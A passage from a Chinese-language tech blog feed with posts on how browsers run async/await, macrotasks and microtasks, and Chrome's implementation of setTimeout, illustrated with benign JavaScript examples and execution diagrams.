class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;&#125;)&#125;<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getResult</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">let</span> a = <span class="hljs-keyword">await</span> NeverResolvePromise()    <span class="hljs-built_in">console</span>.log(a)&#125;getResult()<span class="hljs-built_in">console</span>.log(<span class="hljs-number">0</span>)</code></pre><p>这一段代码，我们使用 await 等待一个没有 resolve 的 Promise，那么这也就意味着，getResult 函数会一直等待下去。</p><p>和生成器函数一样，使用了 async 声明的函数在执行时，也是一个单独的协程，我们可以使用 await 来暂停该协程，由于 await 等待的是一个 Promise 对象，我们可以 resolve 来恢复该协程。</p><p>下面是我从协程的视角，画的这段代码的执行流程图，你可以对照参考下：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0async-await%E7%9A%84%EF%BC%9F/img2.png" class=""><p>如果 await 等待的对象已经变成了 resolve 状态，那么 V8 就会恢复该协程的执行，我们可以修改下上面的代码，来证明下这个过程：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">HaveResolvePromise</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;            resolve(<span class="hljs-number">100</span>)          &#125;, <span class="hljs-number">0</span>);      &#125;)&#125;<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getResult</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-number">1</span>)    <span class="hljs-keyword">let</span> a = <span class="hljs-keyword">await</span> HaveResolvePromise()    <span class="hljs-built_in">console</span>.log(a)    <span class="hljs-built_in">console</span>.log(<span class="hljs-number">2</span>)&#125;<span class="hljs-built_in">console</span>.log(<span class="hljs-number">0</span>)getResult()<span class="hljs-built_in">console</span>.log(<span class="hljs-number">3</span>)</code></pre><p>现在，这段代码的执行流程就非常清晰了，具体执行流程你可以参看下图：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0async-await%E7%9A%84%EF%BC%9F/img3.png" class=""><p>如果 await 等待的是一个非 Promise 对象，比如 await 100，那么通用 V8 会隐式地将 await 后面的 100 包装成一个已经 resolve 的对象，其效果等价于下面这段代码：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ResolvePromise</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;            resolve(<span class="hljs-number">100</span>)      &#125;)&#125;<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getResult</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">let</span> a = <span class="hljs-keyword">await</span> ResolvePromise()    <span class="hljs-built_in">console</span>.log(a)&#125;getResult()<span class="hljs-built_in">console</span>.log(<span class="hljs-number">3</span>)</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Callback 模式的异步编程模型需要实现大量的回调函数，大量的回调函数会打乱代码的正常逻辑，使得代码变得不线性、不易阅读，这就是我们所说的回调地狱问题。</p><p>使用 Promise 能很好地解决回调地狱的问题，我们可以按照线性的思路来编写代码，这个过程是线性的，非常符合人的直觉。但是这种方式充满了 Promise 的 then() 方法，如果处理流程比较复杂的话，那么整段代码将充斥着大量的 then，语义化不明显，代码不能很好地表示执行流程。</p><p>我们想要通过线性的方式来编写异步代码，要实现这个理想，最关键的是要能实现函数暂停和恢复执行的功能。而生成器就可以实现函数暂停和恢复，我们可以在生成器中使用同步代码的逻辑来异步代码 (实现该逻辑的核心是协程)，但是在生成器之外，我们还需要一个触发器来驱动生成器的执行，因此这依然不是我们最终想要的方案。</p><p>我们的最终方案就是 async/await，async 是一个可以暂停和恢复执行的函数，我们会在 async 函数内部使用 await 来暂停 async 函数的执行，await 等待的是一个 Promise 对象，如果 Promise 的状态变成 resolve 或者 reject，那么 async 函数会恢复执行。因此，使用 async/await 可以实现以同步的方式编写异步代码这一目标。</p><p>其实，上面讲的就是前段异步编程的方案史，如下图所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0async-await%E7%9A%84%EF%BC%9F/img4.png" class="">]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浏览器中的宏任务和微任务</title>
    <link href="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/"/>
    <url>/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>在上一篇文章中我们讲了浏览器是如何实现 setTimeout 的，通过 setTimeout 的实现，我们大体上知道了浏览器中消息循环系统是如何工作的。不过随着新技术的涌现，消息队列中这种粗时间颗粒度的任务已经不能满足一些新技术的需求。所以为了满足实时性和效率之间的平衡，浏览器中又出现了一种新的技术——<strong>微任务</strong>。对应的，你们一定听说”宏任务“，那么微任务和宏任务的具体区别是什么，它们是如何相互取长补短的呢？</p><h2 id="宏任务"><a href="#宏任务" class="headerlink" title="宏任务"></a>宏任务</h2><p>前面我们已经介绍过了，页面中的大部分任务都是在主线程上执行的，这些任务包括了：</p><ul><li>渲染事件（如解析 DOM、计算布局、绘制）</li><li>用户交互事件（如鼠标点击、滚动页面、放大缩小等）</li><li>JavaScript 脚本执行事件</li><li>网络请求完成、文件读写完成事件</li></ul><p>为了协调这些任务有条不紊地在主线程上执行，页面进程引入了消息队列和事件循环机制，渲染进程内部会维护多个消息队列，比如延迟执行队列和普通的消息队列。然后主线程采用一个 for 循环，不断地从这些任务队列中取出任务并执行任务。我们把这些消息队列中的任务称为<strong>宏任务</strong>。</p><p>宏任务可以满足我们大部分的日常需求，不过如果有对时间精度要求较高的需求，宏任务就难以胜任了，下面我们就来分析下为什么宏任务难以满足对时间精度要求较高的任务。</p><p>前面我们说过，页面的渲染事件、各种 IO 的完成事件、执行 JavaScript 脚本的事件、用户交互的事件等都随时有可能被添加到消息队列中，而且添加事件是由系统操作的，JavaScript 代码不能准确掌控任务要添加到队列中的位置，控制不了任务在消息队列中的位置，所以很难控制开始执行任务的时间。为了直观理解，你可以看下面这段代码：</p><pre><code class="hljs jsx">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body&gt;        &lt;div id=<span class="hljs-string">&#x27;demo&#x27;</span>&gt;            &lt;ol&gt;                &lt;li&gt;test&lt;/li&gt;            &lt;/ol&gt;        &lt;/div&gt;    &lt;/body&gt;    &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">timerCallback2</span>(<span class="hljs-params"></span>)</span>&#123;          <span class="hljs-built_in">console</span>.log(<span class="hljs-number">2</span>)        &#125;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">timerCallback</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-built_in">console</span>.log(<span class="hljs-number">1</span>)            <span class="hljs-built_in">setTimeout</span>(timerCallback2,<span class="hljs-number">0</span>)        &#125;        <span class="hljs-built_in">setTimeout</span>(timerCallback,<span class="hljs-number">0</span>)    &lt;/script&gt;&lt;/html&gt;</code></pre><p>在这段代码中，我的目的是想通过 setTimeout 来设置两个回调任务，并让它们按照前后顺序来执行，中间也不要再插入其他的任务，因为如果这两个任务的中间插入了其他的任务，就很有可能会影响到第二个定时器的执行时间了。</p><p>但实际情况是我们不能控制的，比如在你调用 setTimeout 来设置回调任务的间隙，消息队列中就有可能被插入很多系统级的任务。你可以打开 Performance 工具，来记录下这段任务的执行过程，也可参考文中我记录的图片：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/img.png" class=""><p>setTimeout 函数触发的回调函数都是宏任务，如图中，左右两个黄色块就是 setTimeout 触发的两个定时器任务。</p><p>现在你可以重点观察上图中间浅红色区域，这里有很多一段一段的任务，这些是被渲染引擎插在两个定时器任务中间的任务。试想一下，如果中间被插入的任务执行时间过久的话，那么就会影响到后面任务的执行了。</p><p>所以说宏任务的时间粒度比较大，执行的时间间隔是不能精确控制的，对一些高实时性的需求就不太符合了，比如后面要介绍的监听 DOM 变化的需求。</p><h2 id="微任务"><a href="#微任务" class="headerlink" title="微任务"></a>微任务</h2><p><strong>微任务就是一个需要异步执行的函数，执行时机是在主函数执行结束之后、当前宏任务结束之前。</strong></p><p>现代浏览器产生微任务只有这两种方式：</p><ol><li>第一种是 Promise ，当调用 Promise.resolve() 或者 Promise.reject() 的时候，会产生微任务，但 Promise 构造函数中的代码会立即执行。</li><li>第二种是使用 MutationObserver 接口，这个接口是 DOM3 Events 规范里的一部分。它的作用就是提供了监视对DOM树所做更改的能力。也就是说当监听的这个DOM节点发生改变的时候，比如增加子节点或者删除子节点等。就会产生 DOM 变化记录的微任务。</li></ol><p>我们再从V8引擎的层面来分析一下微任务是怎么运转的。</p><p>当JS执行一段脚本的时候，V8会为其创建一个全局执行上下文，在创建全局执行上下文的同时，V8引擎也会在内部创建一个微任务队列。这个微任务队列就是用来存放微任务的，因为当前宏任务执行的过程中，有时候会产生多个微任务，这时候就需要使用这个微任务队列来保存这些微任务。不过这个微任务队列是给V8引擎内部使用的，我们是访问不到的。也就是说每个宏任务都关联了一个微任务队列。</p><p><strong>微任务是怎么执行的呢？</strong></p><p>通常情况下，在当前宏任务中的JS快执行完成时，也就在 JS 引擎准备退出全局执行上下文并清空调用栈的时候，JS 引擎会检测全局上下文中的微任务队列，然后按顺序执行队列中的微任务。这个时间点，在标准里叫做<strong>检查点</strong>。当然除了在退出全局执行上下文时的这个检查点外，还有别的的检查点，不过不是太重要，这里就不做介绍了。</p><p>如果在执行微任务的时候，又产生了新的微任务，同样会将该微任务添加到微任务队列中，V8 引擎会一直循环微任务队列中的任务，直到队列为空才算执行结束。</p><p>以上就是微任务的工作流程，我们来总结一下</p><ul><li>微任务和宏任务是绑定的，每个宏任务在执行的时候，都会创建自己的微任务队列。</li><li>微任务的执行时长会影响到当前宏任务的时长。</li></ul><h2 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h2><p>最后，我们通过一段代码，来分析一下微任务和宏任务的执行顺序。</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;bar&#x27;</span>)  <span class="hljs-built_in">Promise</span>.resolve().then(    (str) =&gt;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;micro-bar&#x27;</span>)  )  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">(<span class="hljs-params">str</span>) =&gt;</span><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;macro-bar&#x27;</span>),<span class="hljs-number">0</span>)&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;foo&#x27;</span>)  <span class="hljs-built_in">Promise</span>.resolve().then(    (str) =&gt;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;micro-foo&#x27;</span>)  )  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">(<span class="hljs-params">str</span>) =&gt;</span><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;macro-foo&#x27;</span>),<span class="hljs-number">0</span>)  bar()&#125;foo()<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;global&#x27;</span>)<span class="hljs-built_in">Promise</span>.resolve().then(  (str) =&gt;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;micro-global&#x27;</span>))<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">(<span class="hljs-params">str</span>) =&gt;</span><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;macro-global&#x27;</span>),<span class="hljs-number">0</span>)</code></pre><p>你可以先自己写一下最终打印的结果。最终打印的结果如下：</p><pre><code class="hljs jsx">foobar<span class="hljs-built_in">global</span>micro-foomicro-barmicro-<span class="hljs-built_in">global</span>macro-foomacro-barmacro-<span class="hljs-built_in">global</span></code></pre><p>我们可以清晰地看出，微任务是处于宏任务之前执行的。接下来，我们就来详细分析下 V8 是怎么执行这段 JavaScript 代码的。</p><p>首先，当 V8 执行这段代码时，会将全局执行上下文压入调用栈中，并在执行上下文中创建一个空的微任务队列。那么此时：</p><ul><li>调用栈中包含了全局执行上下文</li><li>微任务队列为空</li></ul><p>此时的消息队列、主线程、调用栈的状态图如下所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/img1.png" class=""><p>然后，执行 foo 函数的调用，V8 会先创建 foo 函数的执行上下文，并将其压入到栈中。接着执行 Promise.resolve，这会触发一个 micro-foo1 微任务，V8 会将该微任务添加进微任务队列。然后执行 setTimeout 方法。该方法会触发了一个 macro-foo1 宏任务，V8 会将该宏任务添加进消息队列。那么此时：</p><ul><li>调用栈中包含了全局执行上下文、foo 函数的执行上下文</li><li>微任务队列有了一个微任务，micro-foo</li><li>消息队列中存放了一个通过 setTimeout 设置的宏任务，macro-foo</li></ul><p>此时的消息队列、主线程和调用栈的状态图如下所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/img2.png" class=""><p>接下来，foo 函数调用了 bar 函数，那么 V8 需要再创建 bar 函数的执行上下文，并将其压入栈中，接着执行 Promise.resolve，这会触发一个 micro-bar 微任务，该微任务会被添加进微任务队列。然后执行 setTimeout 方法，这也会触发一个 macro-bar 宏任务，宏任务同样也会被添加进消息队列。那么此时：</p><ul><li>调用栈中包含了全局执行上下文、foo 函数的执行上下文、bar 的执行上下文</li><li>微任务队列中的微任务是 micro-foo、micro-bar</li><li>消息队列中，宏任务的状态是 macro-foo、macro-bar</li></ul><p>此时的消息队列、主线程和调用栈的状态图如下所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/img3.png" class=""><p>接下来，bar 函数执行结束并退出，bar 函数的执行上下文也会从栈中弹出，紧接着 foo 函数执行结束并退出，foo 函数的执行上下文也随之从栈中被弹出。那么此时：</p><ul><li>调用栈中包含了全局执行上下文，因为 bar 函数和 foo 函数都执行结束了，所以它们的执行上下文都被弹出调用栈了</li><li>微任务队列中的微任务同样还是 micro-foo、micro-bar</li><li>消息队列中宏任务的状态同样还是 macro-foo、macro-bar</li></ul><p>此时的消息队列、主线程和调用栈的状态图如下所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/img4.png" class=""><p>主线程执行完了 foo 函数，紧接着就要执行全局环境中的代码 Promise.resolve 了，这会触发一个 micro-global 微任务，V8 会将该微任务添加进微任务队列。接着又执行 setTimeout 方法，该方法会触发了一个 macro-global 宏任务，V8 会将该宏任务添加进消息队列。那么此时：</p><ul><li>调用栈中包含的是全局执行上下文</li><li>微任务队列中的微任务同样还是 micro-foo、micro-bar、micro-global</li><li>消息队列中宏任务的状态同样还是 macro-foo、macro-bar、macro-global</li></ul><p>此时的消息队列、主线程和调用栈的状态图如下所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/img5.png" class=""><p>等到这段代码即将执行完成时，V8 便要销毁这段代码的环境对象，此时环境对象的析构函数被调用（注意，这里的析构函数是 C++ 中的概念），这里就是 V8 执行微任务的一个检查点，这时候 V8 会检查微任务队列，如果微任务队列中存在微任务，那么 V8 会依次取出微任务，并按照顺行执行。因为微任务队列中的任务分别是：micro-foo、micro-bar、micro-global，所以执行的顺序也是如此。</p><p>此时的消息队列、主线程和调用栈的状态图如下所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/img6.png" class=""><p>等微任务队列中的所有微任务都执行完成之后，当前的宏任务也就执行结束了，接下来主线程会继续重复执行取出任务、执行任务的过程。由于正常情况下，取出宏任务的顺序是按照先进先出的顺序，所有最后打印出来的顺序是：macro-foo、macro-bar、macro-global。</p><p>等所有的任务执行完成之后，消息队列、主线程和调用栈的状态图如下所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E5%AE%8F%E4%BB%BB%E5%8A%A1%E5%92%8C%E5%BE%AE%E4%BB%BB%E5%8A%A1/img7.png" class=""><p>以上就是完整的执行流程的分析，到这里，相信你已经了解微任务和宏任务的执行时机是不同的了，微任务是在当前的任务快要执行结束之前执行的，宏任务是消息队列中的任务，主线程执行完一个宏任务之后，便会接着从消息队列中取出下一个宏任务并执行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上面的例子，我们已经知道了宏任务和微任务在浏览器中是如何执行的。理解了宏任务和微任务的执行顺序，对于面试题中常见的手写一段代码运行结果就变得驾轻就熟。关于这类面试题中常见的 setTimeout、Promise、generate 和 async/await ，我们只介绍了前两个，不过后两个也和微任务有很大关系，具体的我们后面再介绍。</p>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浏览器怎么实现setTimeout的？</title>
    <link href="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0setTimeout%E7%9A%84%EF%BC%9F/"/>
    <url>/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0setTimeout%E7%9A%84%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<p>定时器的概念非常简单，<strong>用来指定某个函数在多少毫秒之后执行</strong>。它会返回一个整数，表示定时器的ID，同时你还可以通过这个ID来取消这个定时器。</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">showName</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;这是一个定时器&quot;</span>)&#125;<span class="hljs-keyword">const</span> timerID = <span class="hljs-built_in">setTimeout</span>(showName, <span class="hljs-number">2</span> * <span class="hljs-number">1000</span>);</code></pre><p>定时器虽然概念简单，但是它里面的陷阱很多，比如：</p><ul><li>定时器是根据第二个参数准时执行的吗？</li><li>定时器的嵌套调用，会有问题吗？</li><li>定时器的第二个参数有最大值吗？</li><li>定时器的第一个参数中 this 指向有什么不一样？</li></ul><p>要想解答这些问题，我们需要了解浏览器到底是如何实现 setTimeout 的。</p><h2 id="浏览器怎么实现-setTimeout-？"><a href="#浏览器怎么实现-setTimeout-？" class="headerlink" title="浏览器怎么实现 setTimeout ？"></a>浏览器怎么实现 setTimeout ？</h2><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0setTimeout%E7%9A%84%EF%BC%9F/img.png" class=""><p>我们再来回顾我在上篇文章讲的事件循环系统。我们知道渲染进程中所有运行在主线程上的任务都需要先添加到消息队列，然后事件循环系统再按顺序执行消息队列中的任务。</p><p>我们再来看几个典型的事件：</p><ul><li>当接收到HTML文档数据，渲染引擎就会将“解析DOM”事件添加到消息队列中</li><li>当用户改变来Web页面的窗口大小，渲染引擎就会将“重新布局”的事件添加到消息队列中</li><li>当触发了JS引擎的垃圾回收机制，渲染引擎会将“垃圾回收”任务添加到消息队列中</li><li>同样，如果要执行一段异步JS代码，也要将执行任务添加到消息队列中</li></ul><p>上面列举的只是一小部分事件，这些事件被添加到消息队列之后，事件循环系统就会按照消息队列中到顺序来执行事件。</p><p>所以说要执行一个异步任务，需要先将任务添加到消息队列之后。不过定时器有点特别，因为它需要保证回调函数在指定的时间间隔内被调用，但消息队列中的任务是按顺序执行的，这样时间是不可控的。所以要保证回调函数能在指定时间内执行，就不能将定时器的回调函数直接添加到消息队列中。</p><p>那应该怎么设计才能让定时器的回调函数在规定的时间内被执行呢？Chrome是这样实现的，<strong>在Chrome中除了正常使用的消息队列之外，还有另外一个消息队列</strong>，这个队列中维护了需要延迟执行的任务列表，包括了定时器和 Chromium 内部一些需要延迟执行的任务。所以当通过JS创建一个定时器时，渲染进程会将该定时器的回调任务添加到延迟队列中。</p><p>源码中延迟执行队列是这样的</p><pre><code class="hljs jsx">DelayedIncomingQueue delayed_incoming_queue;</code></pre><p>下面是一段示例代码</p><pre><code class="hljs jsx">struct DelayTask&#123;  int64 id；  CallBackFunction cbf;  int start_time;  int delay_time;&#125;;DelayTask timerTask;timerTask.cbf = showName;timerTask.start_time = getCurrentTime(); <span class="hljs-comment">//获取当前时间</span>timerTask.delay_time = <span class="hljs-number">200</span>;<span class="hljs-comment">//设置延迟执行时间</span></code></pre><p>当通过JS调用setTimeout设置回调函数的时候，渲染进程将会创建一个回调任务，任务里包含了回调函数名字、延迟的时间。这样创建好任务后，再将该任务添加到延迟执行队列中</p><pre><code class="hljs jsx">delayed_incoming_queue.push(timerTask)；</code></pre><p>现在通过定时器发起的任务已经保存在延迟队列中了，那怎么触发这个延迟队列呢？</p><p>我们来看看前面提到的消息循环代码</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ProcessDelayTask</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-comment">//从delayed_incoming_queue中取出已经到期的定时器任务</span>  <span class="hljs-comment">//依次执行这些任务</span>&#125;<span class="hljs-keyword">const</span> task_queue = []；ProcessTask();<span class="hljs-keyword">let</span> keep_running = <span class="hljs-literal">true</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">MainTherad</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">for</span>(;;)&#123;    <span class="hljs-comment">//执行消息队列中的任务</span>    <span class="hljs-keyword">const</span> task = task_queue.shift();        <span class="hljs-keyword">if</span> (task)        ProcessTask(task);    <span class="hljs-comment">//执行延迟队列中的任务</span>    ProcessDelayTask()    <span class="hljs-keyword">if</span>(!keep_running) <span class="hljs-comment">//如果设置了退出标志，那么直接退出线程循环</span>        <span class="hljs-keyword">break</span>;  &#125;&#125;</code></pre><p>代码里可以看出，我们添加了一个 <strong>ProcessDelayTask 函数</strong>，这个函数是专门来处理延迟执行任务的。在一个循环过程中，当消息队列中的任务被执行完之后，就开始执行ProcessDelayTask函数。ProcessDelayTask函数会根据发起时间和延迟时间计算出到期的任务，然后依次执行这些到期的任务。然后这些延迟任务执行完成之后，再继续下一个循环过程。</p><p>还有一个操作就是，我们可以通过clearTimeout来取消一个定时器，它的实现也很简单。</p><pre><code class="hljs jsx"><span class="hljs-built_in">clearTimeout</span>(timer_id)</code></pre><p>当我们设置一个定时器的时候，JS引擎会返回一个定时器的ID。取消的时候直接从延迟队列中找到ID对应的任务，然后把它删掉就可以了。这样就实现了一个完成的定时器。</p><h2 id="使用-setTimeout-的一些注意事项"><a href="#使用-setTimeout-的一些注意事项" class="headerlink" title="使用 setTimeout 的一些注意事项"></a>使用 setTimeout 的一些注意事项</h2><p>现在你应该知道在浏览器内部定时器是如何工作的了。不过在使用定时器的过程中，如果你不了解定时器的一些细节，那么很有可能掉进定时器的一些陷阱里。下面我们就来回答一下开始的那几个问题。</p><ol><li><p><strong>如果当前任务执行时间过久，会影响定时器任务的执行，导致时间不准</strong></p><p> 其实通过上面的流程，我们可以看出来定时器的时间可能是不准的。如果消息队列里面的一个任务执行时间过长，就会导致定时器的任务会被延后执行。</p></li></ol><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0setTimeout%E7%9A%84%EF%BC%9F/img1.png" class=""><p>长任务导致定时器被延后执行</p><ol start="2"><li><strong>如果 setTimeout 存在嵌套调用，那么系统会设置最短时间间隔为 4 毫秒</strong></li></ol><p>还有就是如果 setTimeout 存在嵌套调用，那么系统会设置最短时间间隔为 4 毫秒。这也就是说定时器函数里面嵌套定时器，也会延长定时器的执行时间。</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cb</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-built_in">setTimeout</span>(cb, <span class="hljs-number">0</span>); &#125;<span class="hljs-built_in">setTimeout</span>(cb, <span class="hljs-number">0</span>);</code></pre><p>我们来看一段代码，相应的执行过程如下</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0setTimeout%E7%9A%84%EF%BC%9F/img2.png" class=""><p>循环嵌套调用 setTimeout</p><p>图里的竖线就是定时器的函数回调过程，从图中可以看出，前面五次调用的时间间隔比较小，嵌套调用5次以上，后面每次调用最小时间间隔是4毫秒。这样做的原因是，定时器嵌套调用5次以上，会被chrome认为该方法被阻塞了，如果这个定时器的调用时间小于4毫秒，那么chrome会将每次调用的时间间隔设置为4毫秒。</p><p>所以一些实时性较高的需要就不太适合用setTimeout了，比如你用setTimeout去实现一个JS动画就不是个好主意。至于替代方案，可以使用CSS3动画，虽然是强大的CSS3也有鞭长莫及的时候，比如像scrollTop值。所以这个时候还需要JS出马，使用window.requestAnimationFrame函数。</p><p>这个函数名表意为“请求动画帧”。它是怎么执行的呢。它是根据设备的刷新率更新的。正常来讲屏幕的刷新率是60帧每秒，也就是说16.7毫秒会更新一帧，一帧就是一张图片。这个函数就是在浏览器每次重绘之前调用这个函数。所以它是不用设置具体的间隔时间的，而且这样执行效率很高，因为每次执行的时机都是固定的。当然raf的回调函数也是在主线程上执行的，如果回调函数执行时间过长，也会影响到其他任务。</p><ol start="3"><li><strong>延时执行时间有最大值</strong></li></ol><p>还有一点就是定时器的执行时间是有最大值的。现在主流的浏览器都是以32个bit来存贮这个时间的。32bit只能存放2^31-1毫秒，也就是大约24.8天。如果设置的时间大于这个数，这个值就会溢出，那么就相当于把时间设置成0了，它就会马上执行。</p><ol start="4"><li><strong>使用 setTimeout 设置的回调函数中的 this 不符合直觉</strong></li></ol><p>如果被 setTimeout 推迟执行的回调函数是某个对象的方法，那么该方法中的 this 关键字将指向全局环境，而不是定义时所在的那个对象。这点在前面介绍 this 的时候也提过，你可以看下面这段代码的执行结果：</p><pre><code class="hljs jsx"><span class="hljs-keyword">var</span> name= <span class="hljs-number">1</span>;<span class="hljs-keyword">var</span> MyObj = &#123;  name: <span class="hljs-number">2</span>,  showName: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.name);  &#125;&#125;<span class="hljs-built_in">setTimeout</span>(MyObj.showName,<span class="hljs-number">1000</span>)</code></pre><p>这里输出的是 1，因为这段代码在编译的时候，执行上下文中的 this 会被设置为全局 window，如果是严格模式，会被设置为 undefined。</p><p>另外还有一种情况，就是当前页面可能不是激活页面，那么 Chrome 会将定时器的最小时间间隔设置为1秒，显然这样可以降低消耗。</p>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浏览器中的消息队列和事件循环</title>
